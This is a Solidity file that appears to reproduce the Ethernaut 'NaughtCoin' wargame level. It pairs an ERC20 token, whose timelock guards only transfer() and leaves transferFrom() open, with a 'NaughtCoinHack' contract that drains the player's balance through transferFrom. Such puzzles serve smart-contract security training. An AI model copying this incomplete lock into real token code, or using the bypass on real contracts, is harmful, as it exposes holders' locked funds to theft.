// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

// NaughtCoin Hack Contract
contract NaughtCoinHack {
    NaughtCoin public immutable naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    function attack() external {
        address player = naughtCoin.player();
        uint256 balance = naughtCoin.balanceOf(player);
        naughtCoin.transferFrom(player, address(this), balance);
    }
}
